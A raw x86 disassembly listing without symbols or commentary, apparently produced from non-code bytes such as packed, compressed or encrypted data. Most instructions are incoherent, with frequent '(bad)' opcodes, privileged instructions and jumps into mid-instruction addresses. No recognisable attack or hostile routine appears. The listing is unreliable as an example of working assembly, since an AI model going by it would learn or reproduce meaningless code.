  432576:	push   esi
  432577:	mov    bh,0xc8
  432579:	or     al,0x2b
  43257b:	mov    bh,0xba
  43257d:	hlt    
  43257e:	mov    bh,bl
  432580:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432586:	dec    edi
  432587:	or     al,0x0
  432589:	mov    edi,DWORD PTR [ebx]
  43258b:	or     BYTE PTR [ebp+0x3b],dh
  43258e:	mov    ecx,DWORD PTR [edi]
  432590:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432596:	xor    al,0xd8
  432598:	pop    bp
  43259a:	lock xor esi,DWORD PTR [ebx]
  43259d:	lea    esp,[esi+0x1f]
  4325a0:	icebp  
  4325a1:	jb     0x4325a7
  4325a3:	add    al,al
  4325a5:	jge    0x4325b3
  4325a7:	mov    eax,eax
  4325a9:	fsubr  st,st(3)
  4325ab:	pop    ebp
  4325ac:	mov    esi,DWORD PTR [ebx]
  4325ae:	in     al,0x8d
  4325b0:	rcr    DWORD PTR [edi],0xc2
  4325b3:	jb     0x432613
  4325b5:	add    cl,cl
  4325b7:	jge    0x4325c5
  4325b9:	mov    edx,DWORD PTR [ebp-0x20]
  4325bc:	in     al,dx
  4325bd:	pop    ebp
  4325be:	data16 data16 or BYTE PTR [esi+edi*4],bh
  4325c3:	cmp    di,WORD PTR [ebp+0x0]
  4325c7:	mov    ebp,DWORD PTR [ebx]
  4325c9:	fdivr  QWORD PTR [esi+0x668a5d]
  4325cf:	cmp    al,0x33
  4325d1:	mov    si,0x4f7d
  4325d5:	mov    eax,DWORD PTR [eax]
  4325d7:	lock inc ebp
  4325d9:	mov    esi,DWORD PTR [esi]
  4325db:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4325e2:	clc    
  4325e3:	(bad)  
  4325e4:	cmp    edi,DWORD PTR [ebx]
  4325e6:	je     0x4325f7
  4325e8:	push   ebx
  4325e9:	loopne 0x4325fa
  4325eb:	dec    ecx
  4325ed:	mov    esp,DWORD PTR [esi-0x1c]
  4325f0:	int    0xf1
  4325f2:	mov    esi,0x703084d
  4325f7:	pcmpgtd mm6,mm1
  4325fa:	add    BYTE PTR [ebp+0x66],dh
  4325fd:	jmp    0x4325ca
  4325ff:	mov    eax,DWORD PTR [ebx]
  432601:	lock push ebp
  432603:	ror    DWORD PTR [ebp-0x2972feb3],1
  432609:	or     bh,dl
  43260b:	jb     0x43260b
  43260d:	add    BYTE PTR [ebx-0x1a7487b3],cl
  432613:	loopne 0x432615
  432615:	jne    0x432617
  432617:	data16 add BYTE PTR [esi+eiz*2],dh
  43261b:	mov    ecx,ebx
  43261d:	data16 cmp dh,cl
  432620:	add    BYTE PTR [edx],bh
  432622:	data16 add bl,cl
  432625:	data16 cmp dh,dl
  432628:	add    BYTE PTR [edx],bh
  43262a:	data16 add bl,cl
  43262d:	enterw 0x4df1,0x19
  432632:	pop    edi
  432633:	jne    0x4325b6
  432635:	mov    esi,DWORD PTR [esi]
  432637:	call   0x77b7b1d8
  43263c:	xor    ebp,DWORD PTR [ebx]
  43263e:	lea    esp,[esi+0x48]
  432641:	repnz in eax,0x3b
  432644:	add    BYTE PTR [ebp-0x37],dh
  432647:	xor    edx,DWORD PTR [ebp-0x15]
  43264a:	in     al,dx
  43264b:	xor    edx,DWORD PTR [esi+0x40]
  43264e:	mov    DWORD PTR [edi],0x338545fc
  432654:	clc    
  432655:	add    esi,DWORD PTR ds:0xe85b9c5f
  43265b:	ret    0xff
  43265e:	dec    DWORD PTR [ebx-0x74f8ae08]
  432664:	cmp    DWORD PTR [esi+0x45],edx
  432667:	add    BYTE PTR [eax+eax*1+0x61],bh
  43266b:	data16 (bad) 
  43266d:	into   
  43266e:	data16 cmp cl,ch
  432671:	add    BYTE PTR [ecx+0x7ce0866],bh
  432677:	cmp    ah,BYTE PTR [esi+0x0]
  43267a:	add    bh,al
  43267c:	add    ah,bh
  43267e:	add    BYTE PTR [ebp+0x35c3f866],al
  432684:	cmp    bl,BYTE PTR [eax+eax*1-0x3c31999a]
  43268b:	pop    ebp
  43268c:	adc    al,0x57
  43268e:	add    BYTE PTR [edi-0x723c409a],dh
  432694:	add    edi,edi
  432696:	jne    0x4326eb
  432698:	lea    edx,[ecx+0x1]
  43269b:	mov    ebx,0xd64ff1
  4326a0:	sar    DWORD PTR [ebx],1
  4326a2:	test   BYTE PTR [ebp+0x34],dh
  4326a5:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4326a9:	push   edi
  4326aa:	xor    BYTE PTR [ebx],0x39
  4326ad:	mov    esi,ebx
  4326af:	xor    eax,DWORD PTR [eax-0x3c73839a]
  4326b5:	xor    al,0x45
  4326b7:	fs pop ebx
  4326b9:	mov    ebx,0x9c3b36
  4326be:	je     0x4326eb
  4326c0:	xor    edi,DWORD PTR [ebx+0x668a33]
  4326c6:	mov    WORD PTR [ebx],?
  4326c8:	xor    al,0xbb
  4326ca:	fs dec edi
  4326cc:	mov    eax,DWORD PTR [eax]
  4326ce:	pop    edi
  4326cf:	cmp    ecx,ecx
  4326d1:	jne    0x432728
  4326d3:	mov    ebp,esp
  4326d5:	cld    
  4326d6:	push   esi
  4326d7:	pop    ebx
  4326d8:	inc    ebp
  4326d9:	stc    
  4326da:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  4326e2:	clc    
  4326e3:	test   dl,dl
  4326e5:	jmp    DWORD PTR ss:[esi+eiz*2+0x5e]
  4326ea:	or     bl,al
  4326ec:	add    BYTE PTR [ebx+0x57665100],cl
  4326f2:	retf   0x3a45
  4326f5:	add    BYTE PTR ss:[esi+eiz*2+0x3a85cabe],bl
  4326fd:	clc    
  4326fe:	add    BYTE PTR [ebx+0x66],bl
  432701:	dec    edx
  432703:	mov    edx,DWORD PTR [edi-0x76]
  432706:	push   edi
  432707:	add    al,0xb7
  432709:	xor    al,0xba
  43270b:	cmp    al,0x8d
  43270d:	je     0x43270e
  43270f:	mov    edx,DWORD PTR [ebx-0x46]
  432712:	push   ecx
  432713:	lea    edi,[ebx+0x534fff]
  432719:	push   ecx
  43271a:	cmp    edx,DWORD PTR [ebx+0x75]
  43271d:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  432723:	add    BYTE PTR [ebx],dh
  432725:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  43272b:	add    BYTE PTR [ebx+esi*1+0x4f64bb34],cl
  432732:	mov    ebx,0x3b3b00
  432737:	jne    0x432764
  432739:	mov    DWORD PTR [ebx+0x728afc],edi
  43273f:	xor    esi,DWORD PTR [ebx]
  432741:	mov    edi,DWORD PTR [ebx+0x8d4f33]
  432747:	push   edi
  432748:	cmp    esp,ebp
  43274a:	jne    0x43274c
  43274c:	sbb    DWORD PTR [eax],0x8085c3fc
  432752:	clc    
  432753:	inc    ebp
  432754:	pop    ebx
  432755:	sti    
  432756:	add    eax,0xeb8bc075
  43275b:	cld    
  43275c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432762:	mov    ecx,DWORD PTR [ecx+edx*2]
  432765:	rol    DWORD PTR [ebp-0x37],0xf
  432769:	mov    DWORD PTR [eax],ecx
  43276b:	inc    edi
  43276c:	(bad)  
  43276d:	in     eax,0x0
  43276f:	add    bh,bh
  432771:	(bad)  
  432772:	mov    esi,0xc38a5e
  432777:	mov    esi,DWORD PTR [ebx]
  432779:	push   ecx
  43277a:	mov    edi,0xfc4fc7
  43277f:	test   DWORD PTR [ebp-0x8],edx
  432782:	xor    ax,0x9cc7
  432786:	sub    ebp,eax
  432788:	inc    ebp
  432789:	(bad)  
  43278a:	sub    edi,edi
  43278c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432792:	inc    ebp
  432793:	add    BYTE PTR [esi+0x2b],ah
  432796:	or     bh,BYTE PTR [edx+0xf8ac2]
  43279c:	cmp    al,0x33
  43279e:	mov    edi,DWORD PTR [edx+0x4f81]
  4327a4:	(bad)  
  4327a5:	cmp    esi,DWORD PTR [ebx]
  4327a7:	je     0x432761
  4327a9:	push   ebx
  4327aa:	dec    edi
  4327ab:	str    ecx
  4327ae:	cmp    esp,DWORD PTR [esi+0x75]
  4327b1:	int    0x33
  4327b3:	mov    edi,0x789085f
  4327b8:	mov    edx,DWORD PTR [esp+edi*8]
  4327bb:	add    cl,cl
  4327bd:	data16 add al,0xcb
  4327c0:	push   ebp
  4327c1:	add    ebp,esp
  4327c3:	jne    0x4327b1
  4327c5:	(bad)  
  4327c6:	mov    DWORD PTR [ecx],0xd685f7ec
  4327cc:	clc    
  4327cd:	xlat   BYTE PTR ds:[ebx]
  4327ce:	inc    ebp
  4327cf:	mov    esi,DWORD PTR [eax+edx*2]
  4327d2:	pushf  
  4327d3:	in     eax,0x8b
  4327d5:	add    ah,ch
  4327d7:	add    BYTE PTR [ebx+0x0],dl
  4327da:	push   ecx
  4327db:	add    ax,0x72cb
  4327df:	cmp    al,BYTE PTR [eax]
  4327e1:	add    BYTE PTR [ebp+0x66],al
  4327e4:	(bad)  
  4327e5:	retf   
  4327e6:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  4327ed:	retf   
  4327ee:	cmp    eax,ecx
  4327f0:	pushf  
  4327f1:	jge    0x4327ba
  4327f3:	ss cld 
  4327f5:	pushf  
  4327f6:	test   DWORD PTR [edi-0x8],ebx
  4327f9:	je     0x432840
  4327fb:	xor    esi,DWORD PTR ds:0x7020840
  432801:	ror    BYTE PTR [ebp-0x37],0x8d
  432805:	push   ebp
  432806:	add    esp,ebp
  432808:	jb     0x432795
  43280a:	add    BYTE PTR [eax],cl
  43280c:	dec    ebp
  43280d:	mov    bh,0x81
  43280f:	push   esi
  432810:	push   ebx
  432811:	adc    DWORD PTR [ecx-0x3b],0x3a9aff81
  432818:	xor    al,BYTE PTR [eax]
  43281a:	mov    edx,DWORD PTR [edi+0x10]
  43281d:	(bad)  
  43281e:	scas   eax,DWORD PTR es:[edi]
  43281f:	cmp    bh,BYTE PTR [ebx]
  432821:	add    BYTE PTR [edi],cl
  432823:	mov    ebp,ebp
  432825:	cld    
  432826:	add    BYTE PTR [ebx],bh
  432828:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  43282c:	dec    ebp
  43282d:	or     BYTE PTR [ebx],ch
  43282f:	ret    0x458b
  432832:	lock jmp 0x432826
  432835:	mov    ecx,DWORD PTR [eax]
  432837:	or     BYTE PTR [edi],al
  432839:	mov    ecx,eax
  43283b:	xor    DWORD PTR [edx+0x2],0x0
  43283f:	mov    bh,0xc1
  432841:	adc    BYTE PTR [eax],dh
  432843:	iret   
  432844:	inc    ebp
  432845:	mov    DWORD PTR [ebx],0x4dfff8c5
  43284b:	inc    BYTE PTR [ebx]
  43284d:	cmp    bh,al
  43284f:	add    BYTE PTR [ecx],dl
  432851:	data16 adc al,bh
  432854:	dec    ecx
  432855:	fisttp WORD PTR [ecx+0x456604c0]
  43285b:	add    dh,BYTE PTR ds:0x75e0845
  432861:	ret    0x4d
  432864:	lea    ecx,[ebx+0x18728301]
  43286a:	add    BYTE PTR [ebp+0x45],al
  43286d:	xor    eax,0xc7009ce9
  432872:	add    al,ch
  432874:	inc    ebp
  432875:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43287b:	xor    eax,0x781084d
  432880:	push   ebx
  432881:	call   0xf89a:0x89813251
  432888:	xor    al,BYTE PTR [ebp+0x3b]
  43288b:	cmp    eax,0xc78b9c76
  432890:	or     ah,dh
  432892:	inc    ebp
  432893:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432899:	cmp    ecx,DWORD PTR [ebx-0x74747664]
  43289f:	in     al,dx
  4328a0:	hlt    
  4328a1:	push   ebx
  4328a2:	push   ebx
  4328a3:	push   ecx
  4328a4:	push   ecx
  4328a5:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4328ab:	call   0xe889:0x8b32329a
  4328b2:	clc    
  4328b3:	icebp  
  4328b4:	pop    ebx
  4328b5:	or     BYTE PTR [ebp+0x7],al
  4328b8:	mov    eax,ecx
  4328ba:	clc    
  4328bb:	jb     0x43287e
  4328bd:	add    BYTE PTR [ebp+0x55],cl
  4328c0:	or     DWORD PTR [edi],0xc251d153
  4328c6:	add    DWORD PTR [ebx+0x32009a],0x8b76453b
  4328d0:	mov    edi,eax
  4328d2:	or     cl,al
  4328d4:	inc    ebp
  4328d5:	dec    ebp
  4328d6:	mov    eax,DWORD PTR [ecx+0x514d530c]
  4328dc:	or     WORD PTR [ecx],0x899a
  4328e1:	xor    cl,BYTE PTR [ebx+0x5376fc3b]
  4328e7:	mov    edx,DWORD PTR [ecx+0x8]
  4328ea:	mov    eax,DWORD PTR [ebp-0x8]
  4328ed:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb266]
  4328f4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328fa:	inc    ebp
  4328fb:	dec    eax
  4328fc:	add    ecx,DWORD PTR [ebx+0x534df0f8]
  432902:	add    edx,DWORD PTR [ecx-0x8]
  432905:	mov    ecx,DWORD PTR [ecx]
  432907:	clc    
  432908:	or     BYTE PTR [ebp+eax*2+0x4532409a],al
  43290f:	mov    ecx,ebp
  432911:	clc    
  432912:	(bad)  
  432913:	popf   
  432914:	inc    DWORD PTR [eax]
  432916:	ret    0x8b
  432919:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  43291f:	mov    edi,esp
  432921:	hlt    
  432922:	test   ecx,esi
  432924:	clc    
  432925:	or     BYTE PTR [ebp+0x7],al
  432928:	xor    al,0xc1
  43292a:	pushf  
  43292b:	jb     0x432960
  43292d:	add    BYTE PTR [eax-0x3f],al
  432930:	inc    eax
  432931:	daa    
  432932:	inc    ebp
  432933:	inc    ebp
  432934:	xor    eax,0x7f80803
  432939:	dec    ebp
  43293a:	call   0xc09:0x39f83203
  432941:	or     BYTE PTR [edx],al
  432943:	inc    ebp
  432944:	sub    al,0x35
  432946:	inc    ebp
  432947:	or     BYTE PTR ds:0x74d0807,dh
  43294d:	lea    ebx,[edx-0x748dcdff]
  432953:	add    BYTE PTR [eax*2-0x74b21438],cl
  43295a:	mov    edx,DWORD PTR [eax]
  43295c:	cld    
  43295d:	dec    ebp
  43295e:	push   ebx
  43295f:	sub    edx,DWORD PTR [ecx-0x75]
  432962:	add    eax,0xf172fc
  432967:	or     BYTE PTR [ebp+0x7],cl
  43296a:	add    eax,ecx
  43296c:	or     al,0x72
  43296e:	add    DWORD PTR [eax],eax
  432970:	mov    ebx,0x29c2c1
  432975:	inc    ebp
  432976:	mov    eax,DWORD PTR [ebx]
  432978:	cmp    eax,0x3004d1c
  43297e:	xbegin 0x66c8b578
  432984:	clc    
  432985:	or     BYTE PTR [ebp+0x45],al
  432988:	xor    al,0x35
  43298a:	pushf  
  43298b:	or     BYTE PTR [ebx+0x454d1007],cl
  432991:	lea    eax,[ebp+0x33727501]
  432997:	add    cl,ch
  432999:	inc    ebp
  43299a:	add    bl,ch
  43299c:	add    BYTE PTR [ebx+0x45850845],cl
  4329a2:	je     0x43292f
  4329a4:	push   ebx
  4329a5:	or     al,0x85
  4329a7:	dec    ebp
  4329a8:	std    
  4329a9:	mov    bh,bh
  4329ab:	mov    BYTE PTR [ebp-0x75],al
  4329ae:	mov    edi,eax
  4329b0:	or     al,0x89
  4329b2:	inc    ebp
  4329b3:	clc    
  4329b4:	mov    esp,esp
  4329b6:	hlt    
  4329b7:	call   DWORD PTR [edi-0x37]
  4329ba:	push   ebx
  4329bb:	or     al,0x51
  4329bd:	push   ebp
  4329be:	xor    ebp,esp
  4329c0:	mov    esi,0x457251
  4329c5:	xor    eax,0xc7459cc6
  4329ca:	mov    edi,eax
  4329cc:	or     al,0x85
  4329ce:	add    al,bh
  4329d0:	inc    eax
  4329d2:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4329d6:	or     ah,bh
  4329d8:	inc    eax
  4329d9:	push   ebx
  4329da:	jmp    0x432a2d
  4329dc:	mov    eax,DWORD PTR ds:0xe8720c
  4329e2:	mov    DWORD PTR [ebp-0x8],eax
  4329e5:	jne    0x432a2c
  4329e7:	jmp    0x432974
  4329e9:	mov    ebp,DWORD PTR [eax]
  4329eb:	clc    
  4329ec:	retf   0xff53
  4329ef:	push   ecx
  4329f0:	mov    DWORD PTR ds:0x757210,eax
  4329f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4329f9:	sub    esp,DWORD PTR [ebx-0x77]
  4329fc:	dec    DWORD PTR [eax*4-0x74ca8abb]
  432a03:	or     ah,bh
  432a05:	pop    es
  432a06:	ds call 0x8f0:0x8b8b32ff
  432a0e:	(bad)  
  432a0f:	dec    ebp
  432a10:	(bad)  
  432a11:	mov    bh,bh
  432a13:	jmp    0x432a01
  432a15:	leave  
  432a16:	jne    0x432a20
  432a18:	call   0x302372
  432a1d:	in     al,dx
  432a1e:	dec    ebp
  432a1f:	add    dh,BYTE PTR [ebx]
  432a21:	add    BYTE PTR [ebx],al
  432a23:	inc    ebp
  432a24:	cmp    esi,DWORD PTR ds:0xc78b9c74
  432a2a:	or     al,0xf0
  432a2c:	add    BYTE PTR [ebp+0x458bf845],al
  432a32:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  432a38:	adc    al,0x7
  432a3a:	enter  0x9fc0,0xa5
  432a3e:	rol    BYTE PTR [eax],0x5e
  432a41:	mov    ecx,ecx
  432a43:	or     al,0xc
  432a45:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a4c:	jmp    0x432a4d
  432a4e:	push   ebp
  432a4f:	mov    esp,ebp
  432a51:	cld    
  432a52:	inc    ebp
  432a53:	inc    ebp
  432a54:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a5b:	push   esi
  432a5c:	push   esi
  432a5d:	mov    edi,0x7af080f
  432a62:	add    bh,al
  432a64:	test   DWORD PTR [edx+0x3a7320f],ebx
  432a6a:	add    BYTE PTR [ecx+0x4540100f],cl
  432a70:	mov    ebp,eax
  432a72:	mov    ebp,edi
  432a74:	lock call edx
  432a77:	fcom   DWORD PTR [ebp+0x45]
  432a7a:	mov    eax,0x148a8b
  432a7f:	push   ecx
  432a80:	enter  0xc145,0x83
  432a84:	cmp    ecx,DWORD PTR [eax]
  432a86:	add    BYTE PTR [ebp+0x4d],al
  432a89:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a8f:	call   0xffa325fe
  432a94:	cmp    eax,DWORD PTR [ebp-0xc]
  432a97:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a9b:	push   ebp
  432a9c:	(bad)
  432a9f:	std    
  432aa0:	lock push DWORD PTR [edi+0x5d08fcdb]
  432aa7:	inc    ebp
  432aa8:	(bad)  
  432aa9:	call   0xff7d2739
  432aae:	add    al,BYTE PTR [ebp+0x37]
  432ab1:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  432ab7:	jne    0x432ab9
  432ab9:	(bad)  
  432aba:	cmp    edi,esp
  432abc:	jne    0x432aef
  432abe:	mov    edi,edi
  432ac0:	or     BYTE PTR [ebx-0x307f0b49],cl
  432ac6:	pop    ds
  432ac7:	into   
  432ac8:	je     0x432a8b
  432aca:	mov    ebx,DWORD PTR [esi]
  432acc:	or     BYTE PTR [ebp-0x49],al
  432acf:	mov    esp,DWORD PTR [esi-0x77]
  432ad2:	mov    esi,0x451f0c
  432ad7:	mov    eax,DWORD PTR [eax]
  432ad9:	or     al,0x66
  432adb:	sar    bl,0x3b
  432ade:	xor    esi,DWORD PTR [ebp+0x66]
  432ae1:	xor    ecx,edi
  432ae3:	pop    edi
  432ae4:	adc    bl,BYTE PTR [ebx+0x7c]
  432ae7:	ret    0xff
  432aea:	cld    
  432aeb:	inc    ebp
  432aec:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432af2:	cld    
  432af3:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432afa:	push   0xffffff83
  432afc:	pop    edi
  432afd:	or     BYTE PTR [ebp+0x53],dh
  432b00:	xorps  xmm1,xmm2
  432b03:	test   BYTE PTR [eax+eax*1],bh
  432b06:	add    BYTE PTR [eax],al
  432b08:	adc    eax,eax
  432b0a:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  432b12:	jmp    DWORD PTR [eax]
  432b14:	ror    al,0x5e
  432b17:	inc    ebp
  432b18:	leave  
  432b19:	xor    ecx,DWORD PTR [eax]
  432b1b:	and    DWORD PTR [ebx-0x3ec50708],ecx
  432b21:	add    ch,al
  432b23:	xor    edi,edi
  432b25:	xor    DWORD PTR [ebx],0x66003300
  432b2b:	mov    DWORD PTR [ebp-0xc],ecx
  432b2e:	pcmpgtw mm0,mm0
  432b31:	add    dl,ah
  432b33:	leave  
  432b34:	mov    edi,DWORD PTR [esi-0x7d]
  432b37:	push   ax
  432b39:	dec    ebp
  432b3a:	mov    esi,DWORD PTR [ebx-0x75]
  432b3d:	lea    ebp,[eax-0x7c010000]
  432b43:	xor    eax,DWORD PTR [eax]
  432b45:	sysret 
  432b47:	dec    ebp
  432b48:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b4f:	push   WORD PTR [ecx+0x8]
  432b53:	jne    0x432b16
  432b55:	ud0    ecx,DWORD PTR [ecx]
  432b58:	mov    edi,DWORD PTR [edx]
  432b5a:	lods   al,BYTE PTR ds:[esi]
  432b5b:	add    BYTE PTR [eax],al
  432b5d:	data16 (bad) 
  432b5f:	iret   
  432b60:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b67:	cli    
  432b68:	inc    ebp
  432b69:	cmp    al,0x8d
  432b6b:	add    BYTE PTR [esi+0x2d],ah
  432b6e:	inc    ebp
  432b6f:	pop    ebp
  432b70:	lea    ecx,[edi]
  432b72:	mov    dl,bh
  432b74:	add    BYTE PTR [edi],cl
  432b76:	mov    DWORD PTR [eax+eax*8],edi
  432b79:	mov    ebx,0x3b87
  432b7e:	add    BYTE PTR [ebx],ch
  432b80:	inc    ebp
  432b81:	data16 (bad) 
  432b83:	clc    
  432b84:	int3   
  432b85:	cmp    eax,DWORD PTR [eax]
  432b87:	je     0x432b12
  432b89:	push   0xffffffc8
  432b8b:	pop    edi
  432b8c:	xchg   DWORD PTR [ebp+0x0],eax
  432b8f:	data16 add BYTE PTR [ebp+0x45],cl
  432b93:	lea    cx,[ebp+0x10]
  432b97:	jb     0x432b99
  432b99:	jmp    0x432b24
  432b9b:	call   eax
  432b9d:	clc    
  432b9e:	xchg   DWORD PTR [edi+0x1],edi
  432ba1:	mov    eax,DWORD PTR [eax]
  432ba3:	or     BYTE PTR [ebp-0x49],al
  432ba6:	lea    eax,[eax+0x74003154]
  432bac:	push   edi
  432bad:	inc    edx
  432bae:	jge    0x432baf
  432bb0:	mov    DWORD PTR [edi],ecx
  432bb2:	fdiv   DWORD PTR [edi-0x6]
  432bb5:	inc    DWORD PTR [eax]
  432bb7:	xor    edx,DWORD PTR [eax+0x5f]
  432bba:	xchg   DWORD PTR [ebx+0x1],ebx
  432bbd:	ret    0x0
  432bc0:	xor    BYTE PTR [ebp-0x51],cl
  432bc3:	cmp    edi,0xf0ff8900
  432bc9:	data16 ror al,0x84
  432bcd:	rol    BYTE PTR [eax],0x3b
  432bd0:	add    al,dh
  432bd2:	dec    eax
  432bd3:	xchg   esp,eax
  432bd4:	push   ebx
  432bd5:	jmp    0x432b62
  432bd7:	push   ebp
  432bd8:	add    esp,ebp
  432bda:	add    ebp,esp
  432bdc:	mov    edx,DWORD PTR [edi+0x24]
  432bdf:	clc    
  432be0:	dec    esi
  432be1:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  432be7:	cmp    BYTE PTR [ebx],al
  432be9:	jne    0x432b74
  432beb:	xor    esp,eax
  432bed:	jmp    0x462d70
  432bf2:	add    ebp,DWORD PTR [ecx+ecx*4]
  432bf5:	jne    0x432beb
  432bf7:	call   0xffcd2951
  432bfc:	clc    
  432bfd:	xchg   edi,eax
  432bfe:	sti    
  432bff:	add    DWORD PTR [ebx],eax
  432c01:	add    BYTE PTR [ebp+0x47],bl
  432c04:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  432c0a:	pop    ebp
  432c0b:	mov    DWORD PTR [esi-0x48],esi
  432c0e:	jmp    0x432c57
  432c10:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  432c16:	(bad)  
  432c18:	cmp    al,0x0
  432c1a:	cmp    eax,DWORD PTR [ebp+0x18]
  432c1d:	lea    ebx,[ebp-0x56]
  432c20:	jle    0x432c22
  432c22:	jae    0x432bad
  432c24:	mov    eax,esp
  432c26:	call   0xb900:0x8b005587
  432c2d:	inc    ebp
  432c2e:	push   ebp
  432c2f:	lea    ecx,[ebp-0x27ff4f12]
  432c35:	mov    eax,edi
  432c37:	int3   
  432c38:	push   ebp
  432c39:	xchg   edi,eax
  432c3b:	add    esp,ebp
  432c3d:	add    BYTE PTR [eax],al
  432c3f:	inc    ebp
  432c40:	add    BYTE PTR [ebp+0x8b3255],cl
  432c46:	cld    
  432c47:	mov    DWORD PTR [edx],edi
  432c49:	aam    0x75
  432c4b:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  432c51:	mov    DWORD PTR [ebx-0x50],edx
  432c54:	test   BYTE PTR [ebp-0x1],0xe8
  432c58:	mov    eax,DWORD PTR [eax]
  432c5a:	hlt    
  432c5b:	add    al,al
  432c5d:	mov    eax,DWORD PTR ds:0x890045a8
  432c63:	dec    DWORD PTR [ebx+0x45fdf0e8]
  432c69:	inc    DWORD PTR [eax*2+0xf75854d]
  432c70:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  432c76:	call   0x729989b7
  432c7b:	je     0x432cdb
  432c7d:	js     0x432cde
  432c7f:	lock ret 0x7e
  432c83:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  432c89:	mov    edi,edi
  432c8b:	sbb    al,bl
  432c8d:	clc    
  432c8e:	add    BYTE PTR [ebp-0x73],bh
  432c91:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  432c97:	ror    BYTE PTR [eax],1
  432c99:	dec    ebp
  432c9a:	xchg   ebp,eax
  432c9b:	mov    edi,edi
  432c9d:	in     al,0x8b
  432c9f:	jge    0x432c2a
  432ca1:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  432ca7:	clc    
  432ca8:	pop    esi
  432ca9:	fist   DWORD PTR [ebp+0x5d398b5d]
  432caf:	clc    
  432cb0:	add    al,0x6e
  432cb2:	mov    eax,DWORD PTR [ebx]
  432cb4:	mov    BYTE PTR [ebp+0x0],dl
  432cb7:	mov    edx,DWORD PTR [ebx-0x20]
  432cba:	adc    esi,DWORD PTR [edi+0x5e005f3a]
  432cc0:	add    eax,0x3b3b73
  432cc5:	adc    al,0x89
  432cc7:	pop    eax
  432cc8:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  432ccc:	ret    0xf08
  432ccf:	cmp    al,0x2
  432cd1:	mov    DWORD PTR [edx],edi
  432cd3:	cld    
  432cd4:	add    BYTE PTR [ebp+0x66],dl
  432cd7:	add    eax,ebx
  432cd9:	add    esp,eax
  432cdb:	sub    eax,eax
  432cdd:	or     BYTE PTR [ecx-0x77f474bb],cl
  432ce3:	add    BYTE PTR [eax],al
  432ce5:	mov    DWORD PTR [ebx-0x24],ebx
  432ce8:	push   edi
  432ce9:	push   ebp
  432cea:	clc    
  432ceb:	add    DWORD PTR [esi+0x1b0100],0x45
  432cf2:	out    0xff,eax
  432cf4:	add    edx,DWORD PTR [eax]
  432cf6:	jmp    0x432ce0
  432cf8:	cmp    ch,0x45
  432cfb:	(bad)  
  432cfc:	jmp    0x40c8b54e
  432d01:	je     0x432c8d
  432d03:	mov    eax,DWORD PTR [eax-0x10c78304]
  432d09:	inc    ebp
  432d0a:	add    BYTE PTR [ebx-0x770375],al
  432d10:	add    ah,ch
  432d12:	add    edx,esp
  432d14:	pop    edi
  432d15:	pop    ebp
  432d16:	push   ebp
  432d17:	inc    ebx
  432d18:	in     al,dx
  432d19:	pop    ebp
  432d1a:	in     al,dx
  432d1b:	cmp    edx,DWORD PTR [edi-0x8]
  432d1e:	xor    eax,0x895b9c94
  432d23:	leave  
  432d24:	call   0x8998742d
  432d29:	in     al,dx
  432d2a:	in     al,0x45
  432d2c:	dec    ebp
  432d2d:	push   esi
  432d2e:	test   DWORD PTR [eax+0xfb010f],esi
  432d34:	add    BYTE PTR [eax+0xc018b],dh
  432d3a:	leave  
  432d3b:	inc    ebp
  432d3c:	test   al,ch
  432d3e:	add    dh,bh
  432d40:	add    bh,bh
  432d42:	dec    ebp
  432d43:	push   cs
  432d44:	mov    DWORD PTR [ecx],eax
  432d46:	hlt    
  432d47:	push   es
  432d48:	dec    ebp
  432d49:	leave  
  432d4a:	mov    DWORD PTR [eax],ecx
  432d4c:	clc    
  432d4d:	cmovge eax,ecx
  432d50:	mov    ecx,0x85c2f0
  432d56:	clc    
  432d57:	pop    DWORD PTR [ebp+0x1]
  432d5a:	push   ebx
  432d5b:	add    BYTE PTR [ebp-0x15],bh
  432d5e:	push   esi
  432d5f:	xor    eax,0x898a45
  432d64:	cld    
  432d65:	add    BYTE PTR [ebp+0x0],al
  432d68:	cmp    esp,DWORD PTR [esi-0x64]
  432d6b:	add    DWORD PTR [esi+0x78308c1],edi
  432d71:	add    ah,BYTE PTR [esi-0x49]
  432d74:	int    0xbb
  432d76:	mov    ecx,DWORD PTR [edi+0xc]
  432d79:	add    dh,al
  432d7b:	cmp    ecx,ebx
  432d7d:	jne    0x432d47
  432d7f:	xor    ecx,DWORD PTR [ebp+0x66]
  432d82:	jmp    0xca2d88
  432d87:	add    DWORD PTR [ebp+0x0],eax
  432d8a:	mov    eax,ebx
  432d8c:	or     al,0x8b
  432d8e:	(bad)  
  432d8f:	mov    ecx,esi
  432d91:	mov    BYTE PTR [eax+eax*1+0x664c134],cl
